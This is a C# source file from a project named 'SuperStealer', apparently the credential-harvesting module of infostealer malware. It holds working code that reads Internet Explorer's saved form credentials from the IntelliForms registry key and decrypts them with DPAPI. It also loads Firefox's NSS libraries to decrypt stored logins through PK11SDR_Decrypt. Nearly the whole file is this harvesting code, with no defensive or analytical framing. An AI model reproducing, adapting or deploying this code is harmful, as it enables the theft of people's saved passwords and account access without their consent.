namespace SuperStealer
{
    using Microsoft.Win32;
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Text;

    public static class CryptoAPI
    {
        private const int ALG_CLASS_HASH = 0x8000;
        private const int ALG_SID_SHA1 = 4;
        private const uint CRYPT_VERIFYCONTEXT = 0xf0000000;
        private const string KeyStr = @"Software\Microsoft\Internet Explorer\IntelliForms\Storage2";
        private const uint PROV_RSA_FULL = 1;

        public static string ANSIStringFromHex(string hexString)
        {
            StringBuilder builder = new StringBuilder(hexString.Length / 2);
            for (int i = 0; i < hexString.Length; i += 2)
            {
                string str = hexString.Substring(i, 2);
                builder.Append(Convert.ToChar(Convert.ToUInt32(str, 0x10)));
            }
            return builder.ToString();
        }

        private static T ByteArrayToStructure<T>(byte[] bytes) where T: struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T local = (T) Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return local;
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll", SetLastError=true)]
        private static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll")]
        private static extern bool CryptDestroyHash(IntPtr hHash);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll", SetLastError=true)]
        private static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll")]
        private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
        public static string Decrypt(byte[] blob)
        {
            byte[] bytes = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(bytes);
        }

        public static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            string uRLHashString = GetURLHashString(url);
            if (!DoesURLMatchWithHash(uRLHashString))
            {
                return false;
            }
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\IntelliForms\Storage2");
            if (key == null)
            {
                return false;
            }
            byte[] encryptedData = (byte[]) key.GetValue(uRLHashString);
            key.Close();
            byte[] dst = new byte[2 * (url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, dst, 0, url.Length * 2);
            byte[] bytes = ProtectedData.Unprotect(encryptedData, dst, DataProtectionScope.CurrentUser);
            IEAutoComplteSecretHeader structure = ByteArrayToStructure<IEAutoComplteSecretHeader>(bytes);
            if (bytes.Length >= ((structure.dwSize + structure.dwSecretInfoSize) + structure.dwSecretSize))
            {
                uint num = structure.IESecretHeader.dwTotalSecrets / 2;
                int num2 = Marshal.SizeOf(typeof(SecretEntry));
                byte[] buffer4 = new byte[structure.dwSecretSize];
                int srcOffset = (int) (structure.dwSize + structure.dwSecretInfoSize);
                Buffer.BlockCopy(bytes, srcOffset, buffer4, 0, buffer4.Length);
                if (dataList == null)
                {
                    dataList = new List<string[]>();
                }
                else
                {
                    dataList.Clear();
                }
                srcOffset = Marshal.SizeOf(structure);
                for (int i = 0; i < num; i++)
                {
                    byte[] buffer5 = new byte[num2];
                    Buffer.BlockCopy(bytes, srcOffset, buffer5, 0, buffer5.Length);
                    SecretEntry entry = ByteArrayToStructure<SecretEntry>(buffer5);
                    string[] item = new string[3];
                    byte[] buffer6 = new byte[entry.dwLength * 2];
                    Buffer.BlockCopy(buffer4, (int) entry.dwOffset, buffer6, 0, buffer6.Length);
                    item[0] = Encoding.Unicode.GetString(buffer6);
                    srcOffset += num2;
                    Buffer.BlockCopy(bytes, srcOffset, buffer5, 0, buffer5.Length);
                    entry = ByteArrayToStructure<SecretEntry>(buffer5);
                    byte[] buffer7 = new byte[entry.dwLength * 2];
                    Buffer.BlockCopy(buffer4, (int) entry.dwOffset, buffer7, 0, buffer7.Length);
                    item[1] = Encoding.Unicode.GetString(buffer7);
                    item[2] = uRLHashString;
                    dataList.Add(item);
                    srcOffset += num2;
                }
            }
            return true;
        }

        public static string DecryptStringFromBase64(string cipherText)
        {
            byte[] bytes = Convert.FromBase64String(cipherText);
            return Encoding.UTF8.GetString(bytes);
        }

        private static bool DoesURLMatchWithHash(string urlHash)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\IntelliForms\Storage2");
            if (key == null)
            {
                return false;
            }
            string[] valueNames = key.GetValueNames();
            foreach (string str in valueNames)
            {
                if (str == urlHash)
                {
                    return true;
                }
            }
            return false;
        }

        public static int GetHexVal(char hex)
        {
            int num = hex;
            return (num - ((num < 0x3a) ? 0x30 : 0x37));
        }

        private static string GetURLHashString(string wstrURL)
        {
            IntPtr zero = IntPtr.Zero;
            IntPtr phHash = IntPtr.Zero;
            CryptAcquireContext(out zero, string.Empty, string.Empty, 1, 0xf0000000);
            if (!CryptCreateHash(zero, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref phHash))
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            byte[] bytes = Encoding.Unicode.GetBytes(wstrURL);
            StringBuilder builder = new StringBuilder(0x2a);
            if (CryptHashData(phHash, bytes, (wstrURL.Length + 1) * 2, 0))
            {
                uint pdwDataLen = 20;
                byte[] pbData = new byte[pdwDataLen];
                if (!CryptGetHashParam(phHash, HashParameters.HP_HASHVAL, pbData, ref pdwDataLen, 0))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                byte num2 = 0;
                builder.Length = 0;
                for (int i = 0; i < pdwDataLen; i++)
                {
                    byte num4 = pbData[i];
                    num2 = (byte) (num2 + num4);
                    builder.AppendFormat("{0:X2}", num4);
                }
                builder.AppendFormat("{0:X2}", num2);
                CryptDestroyHash(phHash);
            }
            CryptReleaseContext(zero, 0);
            return builder.ToString();
        }

        public static byte[] HexStringToByteArray(string hex)
        {
            byte[] buffer = new byte[hex.Length >> 1];
            for (int i = 0; i < (hex.Length >> 1); i++)
            {
                buffer[i] = (byte) ((GetHexVal(hex[i << 1]) << 4) + GetHexVal(hex[(i << 1) + 1]));
            }
            return buffer;
        }

        private enum ALG_ID
        {
            CALG_MD5 = 0x8003,
            CALG_SHA1 = 0x8004
        }

        public static class FFDecryptor
        {
            private static IntPtr _nss3DllPtr;

            public static string Decrypt(string cypherText)
            {
                StringBuilder inStr = new StringBuilder(cypherText);
                int num = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length);
                TSECItem result = new TSECItem();
                TSECItem data = (TSECItem) Marshal.PtrToStructure(new IntPtr(num), typeof(TSECItem));
                if ((PK11SDR_Decrypt(ref data, ref result, 0) == 0) && (result.SECItemLen != 0))
                {
                    byte[] destination = new byte[result.SECItemLen];
                    Marshal.Copy(new IntPtr(result.SECItemData), destination, 0, result.SECItemLen);
                    return Encoding.ASCII.GetString(destination);
                }
                return null;
            }

            [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            public static void Init(string configDir)
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @" (x86)\Mozilla Firefox\";
                if (!Directory.Exists(path))
                {
                    path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Mozilla Firefox\";
                }
                LoadLibrary(path + "msvcr100.dll");
                LoadLibrary(path + "msvcp100.dll");
                LoadLibrary(path + "mozglue.dll");
                _nss3DllPtr = LoadLibrary(path + "nss3.dll");
                NSS_InitPtr delegateForFunctionPointer = (NSS_InitPtr) Marshal.GetDelegateForFunctionPointer(GetProcAddress(_nss3DllPtr, "NSS_Init"), typeof(NSS_InitPtr));
                delegateForFunctionPointer(configDir);
                PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0L);
            }

            [DllImport("kernel32.dll")]
            private static extern IntPtr LoadLibrary(string dllFilePath);
            private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
            {
                NSSBase64_DecodeBufferPtr delegateForFunctionPointer = (NSSBase64_DecodeBufferPtr) Marshal.GetDelegateForFunctionPointer(GetProcAddress(_nss3DllPtr, "NSSBase64_DecodeBuffer"), typeof(NSSBase64_DecodeBufferPtr));
                return delegateForFunctionPointer(arenaOpt, outItemOpt, inStr, inLen);
            }

            private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
            {
                PK11_AuthenticatePtr delegateForFunctionPointer = (PK11_AuthenticatePtr) Marshal.GetDelegateForFunctionPointer(GetProcAddress(_nss3DllPtr, "PK11_Authenticate"), typeof(PK11_AuthenticatePtr));
                return delegateForFunctionPointer(slot, loadCerts, wincx);
            }

            private static long PK11_GetInternalKeySlot()
            {
                PK11_GetInternalKeySlotPtr delegateForFunctionPointer = (PK11_GetInternalKeySlotPtr) Marshal.GetDelegateForFunctionPointer(GetProcAddress(_nss3DllPtr, "PK11_GetInternalKeySlot"), typeof(PK11_GetInternalKeySlotPtr));
                return delegateForFunctionPointer();
            }

            private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
            {
                PK11SDR_DecryptPtr delegateForFunctionPointer = (PK11SDR_DecryptPtr) Marshal.GetDelegateForFunctionPointer(GetProcAddress(_nss3DllPtr, "PK11SDR_Decrypt"), typeof(PK11SDR_DecryptPtr));
                return delegateForFunctionPointer(ref data, ref result, cx);
            }

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            private delegate long NSS_InitPtr(string configdir);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            private delegate long PK11_GetInternalKeySlotPtr();

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            private delegate int PK11SDR_DecryptPtr(ref CryptoAPI.FFDecryptor.TSECItem data, ref CryptoAPI.FFDecryptor.TSECItem result, int cx);

            [StructLayout(LayoutKind.Sequential)]
            private struct TSECItem
            {
                public int SECItemType;
                public int SECItemData;
                public int SECItemLen;
            }
        }

        private enum HashParameters
        {
            HP_ALGID = 1,
            HP_HASHSIZE = 4,
            HP_HASHVAL = 2
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IEAutoComplteSecretHeader
        {
            public uint dwSize;
            public uint dwSecretInfoSize;
            public uint dwSecretSize;
            public CryptoAPI.IESecretInfoHeader IESecretHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IESecretInfoHeader
        {
            public uint dwIdHeader;
            public uint dwSize;
            public uint dwTotalSecrets;
            public uint unknown;
            public uint id4;
            public uint unknownZero;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct SecretEntry
        {
            [FieldOffset(12)]
            public uint dwLength;
            [FieldOffset(0)]
            public uint dwOffset;
            [FieldOffset(4)]
            public byte SecretId;
            [FieldOffset(5)]
            public byte SecretId1;
            [FieldOffset(6)]
            public byte SecretId2;
            [FieldOffset(7)]
            public byte SecretId3;
            [FieldOffset(8)]
            public byte SecretId4;
            [FieldOffset(9)]
            public byte SecretId5;
            [FieldOffset(10)]
            public byte SecretId6;
            [FieldOffset(11)]
            public byte SecretId7;
        }
    }
}

